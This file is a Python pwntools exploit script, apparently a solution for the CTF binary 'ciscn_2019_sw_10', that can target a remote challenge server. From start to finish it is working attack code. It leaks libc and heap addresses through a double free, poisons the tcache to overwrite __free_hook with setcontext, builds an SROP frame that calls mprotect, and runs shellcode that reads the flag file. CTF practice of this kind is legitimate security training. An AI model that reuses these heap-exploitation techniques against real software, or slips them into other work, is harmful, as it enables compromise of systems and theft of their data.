import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_sw_10')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_sw_10')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26162)
			elf=ELF('./ciscn_2019_sw_10')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('>> ','1')
			io.sendlineafter('size?',str(a))
			io.sendafter('content?',b)

		def show(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('index ?',str(a))

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('index ?',str(a))

			
		io.recv()
		io.sendline('keer')
		add(0x4f0,'a')
		add(0x200,'a')
		delete(0)
		show(0)
		io.recv(1)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(1)
		delete(1)
		show(1)
		io.recv(1)
		heap_base=u64(io.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x760
		add(0x200,p64(libc.sym['__free_hook']))
		add(0x200,p64(libc.sym['__free_hook']))
		free_hook_addr=libc.sym['__free_hook']
		new_shell_code_head_addr=free_hook_addr&0xfffffffffffff000
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%new_shell_code_head_addr

		pay=p64(libc.sym['setcontext']+53)+p64(free_hook_addr+0x10)+asm(shell1)
		add(0x200,pay)
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=free_hook_addr+0x8
		srop_mprotect.rdi=new_shell_code_head_addr
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		add(0x4f0,str(srop_mprotect))
		# gdb.attach(io)
		# pause()
		delete(0)
		shell2='''
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		mov  rsi,0x0
		xor  rdx,rdx
		mov  rax,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		io.sendline(asm(shell2))



		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue